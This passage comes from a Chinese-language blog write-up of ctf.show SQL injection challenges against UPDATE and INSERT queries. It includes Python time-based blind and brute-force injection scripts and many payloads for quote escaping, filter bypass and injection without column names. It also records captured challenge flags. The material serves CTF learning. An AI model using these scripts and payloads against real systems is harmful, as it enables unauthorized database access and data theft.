class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(end) == <span class="string">&quot;&#125;&quot;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(end) == <span class="string">&quot;!&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\r[+] result: <span class="subst">&#123;result&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n本天才查询完成 ｡◕‿◕｡ &quot;</span>)</span><br></pre></td></tr></table></figure></div>



<p>这是参考b477eRy师傅的脚本写的，其中他将password设为了值str(random.random())，我最初研究之后认为还是自己sql语言没学好，认为应该是 update 在遇到 相同的值，在一些情况是不会进行修改的，也就是说这里取随机数的目的就是让他不相等，免得导致where子句if不执行。但是看了其他师傅的时间盲注，我才意识到，应该是修改相同之后，会导致页面返回值一直返回更新成功（这题就是语句错了也tnnd返回更新成功，所以如果密码需要一直变）（对了，username也要写一个存在的字段名才行）</p>
<p>还有其他师傅写的时间盲注脚本，但是它的这里username 和password都没有上面的限制（不需要在乎页面的返回值）。</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://d4c54e32-5b33-408d-a14a-2f2b6a7f553f.challenge.ctf.show/api/?page=1&amp;limit=10&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查表名</span></span><br><span class="line">        <span class="comment"># payload = &quot;select column_name from information_schema.columns where table_name=&#x27;flag233333&#x27; limit 1,1&quot;</span></span><br><span class="line">        <span class="comment"># 查数据</span></span><br><span class="line">        payload = <span class="string">&quot;select flagass233 from flag233333&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;1&#x27; or if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(0.05),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;4&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">0.9</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div>



<h2 id="234（无单引号，使用-逃逸）"><a href="#234（无单引号，使用-逃逸）" class="headerlink" title="234（无单引号，使用  \  逃逸）"></a>234（无单引号，使用  \  逃逸）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//无过滤</span></span><br></pre></td></tr></table></figure></div>

<p>其实是有过滤的，过滤了单引号</p>
<p>我们可以用 \ 来逃逸，将后一半引号转义变为</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;\&#x27; where username = &#x27;username&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure></div>

<p>这样<code>pass</code>里面的内容就是<code>&#39; where username =</code>,接下来<code>username</code>里面的参数就是可以控制的了</p>
<p>然后直接使用最开始的方法就行（需要注意的是username里面要先写一个 <code>,</code> (逗号) 先把前面的句子分开，然后再写一个username&#x3D;）</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload(记得url encode一下，字段名好像必须得<span class="number">16</span>进制，原型的 &quot;\&quot; &quot;#&quot; 和表名啥的直接执行不出来<span class="operator">=</span>。<span class="operator">=</span> ):</span><br><span class="line"># banlist,ctfshow_user,flag23a</span><br><span class="line">password<span class="operator">=</span><span class="operator">%</span><span class="number">5</span>C<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">%</span><span class="number">23</span></span><br><span class="line">  </span><br><span class="line"># id,flagass23s3,info</span><br><span class="line">password<span class="operator">=</span><span class="operator">%</span><span class="number">5</span>c<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x666c6167323361</span>)<span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line">#ctfshow&#123;<span class="number">9</span>f94d0df<span class="number">-2</span>bee<span class="number">-4286</span><span class="number">-9</span>c98<span class="number">-68</span>bc2c9f4ee1&#125;</span><br><span class="line">password<span class="operator">=</span><span class="operator">%</span><span class="number">5</span>C<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> flagass23s3 <span class="keyword">from</span> flag23a)<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure></div>



<p>效果图</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220827203644095.png"
                      alt="image-20220827203644095"
                ></p>
<h2 id="235（无列名注入，information-schema-被过滤）"><a href="#235（无列名注入，information-schema-被过滤）" class="headerlink" title="235（无列名注入，information_schema 被过滤）"></a>235（无列名注入，information_schema 被过滤）</h2><p>部分资料</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98206699" >CTF|mysql之无列名注入 - 知乎 (zhihu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>在 mysql &#x3D;&gt; 5 的版本中存在一个名为 information_schema 的库，里面记录着 mysql 中所有表的结构。通常，在 mysql sqli 中，我们会通过此库中的表去获取其他表的结构，也就是表名、列名等。但是这个库经常被 WAF 过滤。</p>
<p>在 information_schema 中，除了 SCHEMATA、TABLES、COLUMNS 有表信息外，高版本的 mysql 中，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。</p>
<p><strong>文章中还提到了个别名，自己尝试之后才理解为什么要写，具体看下面</strong></p>
</blockquote>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.jb51.net/article/134678.htm" >概述MySQL统计信息_Mysql_脚本之家 (jb51.net) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>5.6.6开始，MySQL默认使用了持久化统计信息，即INNODB_STATS_PERSISTENT&#x3D;ON，持久化统计信息保存在表mysql.innodb_table_stats和mysql.innodb_index_stats。</p>
</blockquote>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//过滤 or &#x27; </span></span><br></pre></td></tr></table></figure></div>



<p><strong>看题目，过滤了 or 和 ‘ 这样 information_schema 就也不能用了（information单词里面有or，惨），改用  mysql.innodb_table_stats 查表名</strong></p>
<p><strong>payload <font color=red>（记得查数据的时候一定要配合limit）</font></strong></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># payload <span class="number">1</span> </span><br><span class="line"># banlist,ctfshow_user,flag23a1</span><br><span class="line">username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> mysql.innodb_table_stats <span class="keyword">where</span> database_name<span class="operator">=</span>database())<span class="comment">-- - &amp;password=\</span></span><br><span class="line"></span><br><span class="line"># payload <span class="number">2</span></span><br><span class="line"># ctfshow&#123;<span class="number">2e79</span>edc9<span class="number">-0</span>d19<span class="number">-4</span>aac<span class="number">-945</span>a<span class="number">-4</span>f796dfc35a0&#125;</span><br><span class="line">username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> b <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag23a1 limit <span class="number">1</span>,<span class="number">1</span>)a)<span class="comment">-- -&amp;password=\</span></span><br><span class="line"># 因为这里只能单行显示，所以要配合limit来一个一个查，没有limit的话查不出来</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者一样的没区别只是如果没过率数字可以这样玩</span><br><span class="line"># username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> `<span class="number">2</span>` <span class="keyword">from</span>(<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag23a1 limit <span class="number">1</span>,<span class="number">1</span>)a)<span class="comment">-- - &amp;password=\</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p>接下来来说一下取别名的事，因为我看那个取了别名a却没有使用，我在想能不能不进行取别名的操纵，但是实际上，我们去掉取别名的操作就执行不了了，我们在本地试试</p>
<p><strong>先看看antry表内容</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220828162105726.png"
                      alt="image-20220828162105726"
                ></p>
<p><strong>再使用上面payload的取别名的方式进行查找</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220828162153542.png"
                      alt="image-20220828162153542"
                ></p>
<p><strong>删除别名</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220828162245348.png"
                      alt="image-20220828162245348"
                ></p>
<p>发现报错了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Every derived table must have its own alias</span><br></pre></td></tr></table></figure></div>

<p>大体可以参考文章</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32863631/article/details/83024322" >(37条消息) Every derived table must have its own alias（sql语句错误解决方法）_MonoWx的博客-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>总之就是多表查询时，派生表需要起别名(到头来还是当时学mysql的时候偷工减料了QAQ)</strong></p>
<h2 id="236（没啥重点，检测返回值）"><a href="#236（没啥重点，检测返回值）" class="headerlink" title="236（没啥重点，检测返回值）"></a>236（没啥重点，检测返回值）</h2><p>没啥好说的，检测返回值是否包含”flag”字符串（也就是说上一题payload可以直接打&#x3D;。&#x3D;，因为flag里面其实是ctfshow{xxxx}，没有flag字符串（除非运气太差了），可能是以前是flag{xxx}，后来改了，但是没改题）</p>
<p>具体遇到这种题，使用个to_base64即可，最开始的sql注入就遇到过这种问题&#x3D;。&#x3D;</p>
<p>payload</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> mysql.innodb_table_stats <span class="keyword">where</span> database_name<span class="operator">=</span>database())<span class="comment">-- - &amp;password=\</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> to_base64(b) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flaga limit <span class="number">1</span>,<span class="number">1</span>)a)<span class="comment">-- - &amp;password=\</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>





<h1 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h1><h2 id="237"><a href="#237" class="headerlink" title="237"></a>237</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//插入数据</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into ctfshow_user(username,pass) value(&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//无过滤</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h3 id="payload-1（没过滤单引号，简单闭合）"><a href="#payload-1（没过滤单引号，简单闭合）" class="headerlink" title="payload 1（没过滤单引号，简单闭合）"></a><strong>payload 1（没过滤单引号，简单闭合）</strong></h3><p>(直接在添加框内输入就行，不需要hackbar也行,，需要注意的就是最后还得加上 <code>);</code>  来闭合value函数，不然执行不了）</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 查表名 </span><br><span class="line"># banlist,ctfshow_user,flag</span><br><span class="line">username<span class="operator">=</span>koishi<span class="string">&#x27;,(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()));#</span></span><br><span class="line"><span class="string">password=1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查数据——无列名查询（既然会了这么便利的方式，就直接使用了，也可以使用之前的步骤先字段名再字段值）</span></span><br><span class="line"><span class="string">koishi&#x27;</span>,(<span class="keyword">select</span> b <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag limit <span class="number">1</span>,<span class="number">1</span>)a));#</span><br></pre></td></tr></table></figure></div>

<p>这个payload是通过闭合单引号的方式来查询的，还有师傅说可以用username取 \  的方式来逃逸出 password 来进行注入，但是我实际测试没弄出来，淦</p>
<p>(奥，弄出来了，我是铸币，是在发现最后要加上 <code>0;</code> 之后，才发现之前试的时候没加)</p>
<h3 id="payload-2（假如过滤了单引号，-逃逸）"><a href="#payload-2（假如过滤了单引号，-逃逸）" class="headerlink" title="payload 2（假如过滤了单引号，\ 逃逸）"></a>payload 2（假如过滤了单引号，\ 逃逸）</h3><p>下面输入的位置都是</p>
<blockquote>
<p>用户名</p>
<p>密码</p>
</blockquote>
<p>的形式</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 查表名</span><br><span class="line"># banlist,ctfshow_user,flag</span><br><span class="line">\</span><br><span class="line">,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()));#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 无列名查询</span><br><span class="line"># ctfshow&#123;<span class="number">5e1</span>b90d2<span class="number">-20</span>b4<span class="number">-4685</span><span class="operator">-</span>ac6a<span class="number">-1580</span>a25c1352&#125;</span><br><span class="line">\</span><br><span class="line">,(<span class="keyword">select</span> b <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag limit <span class="number">1</span>,<span class="number">1</span>)a));#</span><br></pre></td></tr></table></figure></div>



<h2 id="238（过滤空格）"><a href="#238（过滤空格）" class="headerlink" title="238（过滤空格）"></a>238（过滤空格）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//插入数据</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into ctfshow_user(username,pass) value(&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;);&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//过滤空格</span></span><br></pre></td></tr></table></figure></div>

<p>尝试 <code>%09 %0a %0b %0c %0d /**/</code> 都不行，括号可以。</p>
<p>我们常规的payload 可以使用括号绕过，而无列名查询不能用了QAQ（union和select之间没法括号隔开） ，简单贴一下payload</p>
<p>payload（皆放username位置，password随便）</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 数据库</span><br><span class="line"># banlist,ctfshow_user,flagb</span><br><span class="line">koishi<span class="string">&#x27;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())));#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查列名</span></span><br><span class="line"><span class="string"># id,flag,info</span></span><br><span class="line"><span class="string">koishi&#x27;</span>,(<span class="keyword">select</span>(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_schema<span class="operator">=</span>database())<span class="keyword">and</span>(table_name<span class="operator">=</span><span class="string">&#x27;flagb&#x27;</span>)));#</span><br><span class="line"></span><br><span class="line"># 查数据</span><br><span class="line"># ctfshow&#123;<span class="number">0149052</span>a<span class="operator">-</span>d915<span class="number">-40</span>ca<span class="number">-8</span>a23<span class="number">-08125298</span>eaeb&#125;</span><br><span class="line">koishi<span class="string">&#x27;,(select(group_concat(flag))from(flagb)));#</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>



<p>这里也可以使用 \ 逃逸的形式，但是我就不再写了，实战遇到进行修改即可</p>
<h2 id="239（空格和information-schema）"><a href="#239（空格和information-schema）" class="headerlink" title="239（空格和information_schema）"></a>239（空格和information_schema）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//插入数据</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into ctfshow_user(username,pass) value(&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//过滤空格 or </span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">value</span>(<span class="string">&#x27;&#123;$username&#125;&#x27;</span>,<span class="string">&#x27;&#123;$password&#125;&#x27;</span>);<span class="string">&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>有过滤的 insert 注入、相比上题过滤了 <code>or</code>，<code>information_schema</code> 再次中枪，改用 <code>mysql.innodb_table_stats</code>，其他不变。</p>
<h3 id="半场payload"><a href="#半场payload" class="headerlink" title="半场payload"></a><strong>半场payload</strong></h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">sql</span>查表名</span><br><span class="line"># banlist,ctfshow_user,flagbb</span><br><span class="line">koishi<span class="string">&#x27;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#</span></span><br></pre></td></tr></table></figure></div>

<p>到这里就尬住了，过滤了空格，无列名注入用不了，or也过滤了，这样查不到列名，所以我们只能爆破了&#x3D;。&#x3D;</p>
<p>自己写脚本跑吧，脚本里面用的是 \ 逃逸的方法（因为想两个都练练加深印象，当然正常的也行）</p>
<h3 id="script"><a href="#script" class="headerlink" title="script"></a><strong>script</strong></h3><p>（由于不论语句是否正常，页面都是返回的是 “插入成功” ，意味着布尔盲注下台了。而information_schema被禁了，也意味着时间盲注拜拜，但是这题有个好处就是我们可以随时看见数据有哪些，也就是说我们只用看看页面上存不存在我们插入的数据就能判断了(因为找不到那些数据在哪个页面，所以先跑一点点看看页面上有没有吧，本来想写脚本一次性拿到的，哎)。还有用不了二分法，因为比较不了，只能从头跑到尾了。bp也能爆破，但是本着练手的目的，试着写了脚本，妈的**<font color=red>写了两个半小时</font>**，下次有现成工具，狗都不写脚本。也说明了我python算法真的拉（我真的觉得我能写出来真的谢天谢地了））</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> deepcopy</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://042fe865-c53e-4f80-9627-5043eff5461d.challenge.ctf.show/api/insert.php&quot;</span></span><br><span class="line"><span class="comment"># 输入框在insert.php，千万别只写api就结束了</span></span><br><span class="line">payload = <span class="string">&quot;koishi&#x27;,(select(&#123;&#125;)from(flagbb)));#&quot;</span></span><br><span class="line">s = <span class="string">&quot;acfgl&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">permutations</span>(<span class="params">arr, position, end</span>):</span><br><span class="line">    <span class="keyword">if</span> position == end:</span><br><span class="line">        <span class="comment">#    if position == end-1:</span></span><br><span class="line">        h.append(deepcopy(arr))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(position, end):</span><br><span class="line">            arr[index], arr[position] = arr[position], arr[index]</span><br><span class="line"></span><br><span class="line">            permutations(arr, position + <span class="number">1</span>, end)</span><br><span class="line">            arr[index], arr[position] = arr[position], arr[index]</span><br><span class="line"><span class="keyword">global</span> h</span><br><span class="line">h = []</span><br><span class="line"></span><br><span class="line">index =<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    nameList = <span class="built_in">list</span>(itertools.combinations(<span class="built_in">list</span>(s), index))</span><br><span class="line">    a = <span class="built_in">list</span>(itertools.combinations(<span class="built_in">list</span>(<span class="string">&quot;1234&quot;</span>), <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">for</span> temp <span class="keyword">in</span> nameList:</span><br><span class="line">        trueName = <span class="built_in">str</span>(temp).replace(<span class="string">&quot;,&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;(&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;)&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        arr = <span class="built_in">list</span>(trueName)</span><br><span class="line">        permutations(arr, <span class="number">0</span>, <span class="built_in">len</span>(arr))</span><br><span class="line">        <span class="keyword">for</span> temp <span class="keyword">in</span> h:</span><br><span class="line">            finalName=<span class="built_in">str</span>(temp).replace(<span class="string">&quot;,&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;[&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;]&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: payload.<span class="built_in">format</span>(finalName),</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            requests.post(url=url,data=data)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">            h=[]</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> index &gt;= <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

